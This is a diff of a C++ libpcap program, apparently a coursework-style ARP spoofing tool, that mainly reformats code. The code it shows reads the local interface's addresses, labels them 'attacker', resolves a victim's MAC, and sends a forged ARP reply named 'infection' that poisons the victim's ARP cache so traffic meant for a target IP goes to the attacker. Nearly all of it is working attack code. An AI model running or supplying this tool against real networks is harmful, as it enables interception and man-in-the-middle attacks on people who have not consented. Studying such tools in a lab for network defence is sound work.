@@ -7,7 +7,6 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 #include <netinet/in.h>
-
 #include "ethhdr.h"
 #include "arphdr.h"
 
@@ -46,7 +45,6 @@ Interface getInterface(const char* dev) {
         close(fd);
         exit(EXIT_FAILURE);
     }
-
     Mac mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
 
     if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
@@ -54,7 +52,6 @@ Interface getInterface(const char* dev) {
         close(fd);
         exit(EXIT_FAILURE);
     }
-
     auto* addr = reinterpret_cast<sockaddr_in*>(&ifr.ifr_addr);
     Ip ip(ntohl(addr->sin_addr.s_addr));
 
@@ -71,7 +68,6 @@ EthArpPacket makePacket(
     const Ip& tip
 ) {
     EthArpPacket packet{};
-
     packet.eth_.dmac_ = dmac;
     packet.eth_.smac_ = smac;
     packet.eth_.type_ = htons(EthHdr::Arp);
@@ -95,7 +91,6 @@ void sendPacket(pcap_t* handle, const EthArpPacket& packet) {
         reinterpret_cast<const u_char*>(&packet),
         sizeof(packet)
     );
-
     if (result != 0) {
         fprintf(stderr, "pcap_sendpacket: %s\n", pcap_geterr(handle));
         exit(EXIT_FAILURE);
@@ -115,45 +110,28 @@ Mac resolveMac(
         Mac::nullMac(),
         senderIp
     );
-
     sendPacket(handle, request);
 
     while (true) {
         pcap_pkthdr* header;
         const u_char* data;
-
         int result = pcap_next_ex(handle, &header, &data);
 
-        if (result == 0)
-            continue;
-
+        if (result == 0) continue;
         if (result < 0) {
             fprintf(stderr, "pcap_next_ex: %s\n", pcap_geterr(handle));
             exit(EXIT_FAILURE);
         }
 
-        if (header->caplen < sizeof(EthArpPacket))
-            continue;
+        if (header->caplen < sizeof(EthArpPacket)) continue;
 
-        auto* packet =
-            reinterpret_cast<const EthArpPacket*>(data);
+        auto* packet = reinterpret_cast<const EthArpPacket*>(data);
 
-        if (packet->eth_.type_ != htons(EthHdr::Arp))
-            continue;
-
-        if (packet->arp_.op_ != htons(ArpHdr::Reply))
-            continue;
-
-        if (static_cast<uint32_t>(packet->arp_.sip_) !=
-            htonl(static_cast<uint32_t>(senderIp)))
-            continue;
-
-        if (static_cast<uint32_t>(packet->arp_.tip_) !=
-            htonl(static_cast<uint32_t>(me.ip)))
-            continue;
-
-        if (packet->arp_.tmac_ != me.mac)
-            continue;
+        if (packet->eth_.type_ != htons(EthHdr::Arp)) continue;
+        if (packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
+        if (ntohl(packet->arp_.sip_) != senderIp) continue;
+        if (ntohl(packet->arp_.tip_) != me.ip) continue;
+        if (packet->arp_.tmac_ != me.mac) continue;
 
         return packet->arp_.smac_;
     }
@@ -166,10 +144,7 @@ int main(int argc, char* argv[]) {
     }
 
     char errbuf[PCAP_ERRBUF_SIZE];
-
-    pcap_t* handle =
-        pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
-
+    pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr) {
         fprintf(
             stderr,
@@ -181,7 +156,6 @@ int main(int argc, char* argv[]) {
     }
 
     Interface me = getInterface(argv[1]);
-
     printf(
         "attacker: %s / %s\n",
         std::string(me.ip).c_str(),
@@ -193,19 +167,16 @@ int main(int argc, char* argv[]) {
         Ip targetIp(argv[i + 1]);
 
         printf("[*] resolving %s\n", argv[i]);
-
-        Mac senderMac =
-            resolveMac(handle, me, senderIp);
+        Mac senderMac = resolveMac(handle, me, senderIp);
 
         EthArpPacket infection = makePacket(
-            senderMac,         // Ethernet destination
-            me.mac,            // Ethernet source
+            senderMac, 
+            me.mac,     
             ArpHdr::Reply,
-            targetIp,          // "Target IP is..."
+            targetIp,    
             senderMac,
             senderIp
         );
-
         sendPacket(handle, infection);
 
         printf(
